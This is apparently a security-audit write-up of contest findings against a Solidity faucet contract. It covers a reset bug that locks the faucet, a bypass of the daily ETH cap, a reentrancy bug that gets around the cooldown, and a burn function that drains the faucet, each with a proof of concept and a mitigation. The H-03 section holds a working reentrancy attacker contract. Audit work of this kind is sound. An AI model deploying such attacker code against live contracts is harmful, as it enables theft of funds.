# CodeHawks First Flight #2 — 3 High + 1 Medium Findings

**Contest**: CodeHawks First Flight #2  
**Severity**: 3 High, 1 Medium  
**Status**: Validated by judges

## H-01: dailyClaimCount Does Not Reset → Permanent Faucet Lockup

### Impact
High — The faucet can become permanently unusable for all users.

### Root Cause
The daily counter reset logic is placed **after** the daily limit check. If the limit is reached and no successful claim occurs the next day, the reset is never triggered.

### Proof of Concept
```solidity
function test_permanentDos() public {
    faucet.adjustDailyClaimLimit(99, false); // limit = 1

    // Day 1: Reach limit
    vm.prank(user1);
    faucet.claimFaucetTokens();

    // Fast-forward 2 days (no activity on day 2)
    vm.warp(block.timestamp + 2 days);

    // Day 3: Still blocked — permanent lockup
    vm.prank(user2);
    vm.expectRevert();
    faucet.claimFaucetTokens();
}
```

### Recommended Mitigation
Move reset logic to the beginning of the function.

## H-02: Daily ETH Cap Bypassable → Complete ETH Drain

### Impact
High — Attacker can drain all ETH from the faucet.

### Root Cause
Repeat claimers incorrectly reset dailyDrips to 0, allowing new claimers to bypass the cap.

### Proof of Concept
```solidity
function test_drainEthByBypassingDailyCap() public {
    // Setup: daily cap 0.02 ETH, drip 0.01 ETH
    vm.deal(address(faucet), 0.1 ether);

    // Repeat claimer resets counter between new claims
    // → Allows 3+ claims instead of 2
}
```

### Recommended Mitigation
Remove the erroneous dailyDrips = 0 in the else branch.

## H-03: Reentrancy in claimFaucetTokens() → Cooldown Bypass
Impact

### Impact
High — Attacker contract can claim repeatedly, bypassing 3-day cooldown.

### Root Cause
Violates Checks-Effects-Interactions: ETH .call occurs before updating lastClaimTime and dailyClaimCount.

### Proof of Concept

Malicious contract with receive() re-enters claimFaucetTokens() multiple times in one tx.
```solidity
pragma solidity ^0.8.18;
​
interface IRaiseBoxFaucet {
    function claimFaucetTokens() external;
    function getFaucetTotalSupply() external view returns (uint256);
    function faucetDrip() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}
​
contract Attacker {
    IRaiseBoxFaucet public faucet;
    uint8 public reentryCount;
​
    constructor(address faucetAddr) {
        faucet = IRaiseBoxFaucet(faucetAddr);
    }
​
    // Start the attack (call this from an EOA)
    function startAttack() external {
        faucet.claimFaucetTokens();
    }
​
    // When the faucet sends ETH to this contract, re-enter claimFaucetTokens()
    receive() external payable {
        // Re-enter a few times while faucet still has tokens
        if (reentryCount < 4 && faucet.getFaucetTotalSupply() > faucet.faucetDrip()) {
            reentryCount++;
            faucet.claimFaucetTokens();
        }
    }
}
```

### Recommended Mitigation
Apply all state changes (Effects) before external calls (Interactions).

## M-01: burnFaucetTokens() Drains All Tokens to Owner

### Impact
Medium — Unexpected full drain of faucet balance.

### Root Cause
Function transfers entire faucet balance to owner before burning specified amount.

### Proof of Concept
```solidity
function test_burnDrainsFaucet() public {
    uint initialFaucetBal = faucet.balanceOf(address(faucet));
    vm.prank(owner);
    faucet.burnFaucetTokens(100 * 10**18);

    assertEq(faucet.balanceOf(address(faucet)), 0); // Drained
}
```

### Recommended Mitigation
Burn directly from address(this) instead of transferring to owner first.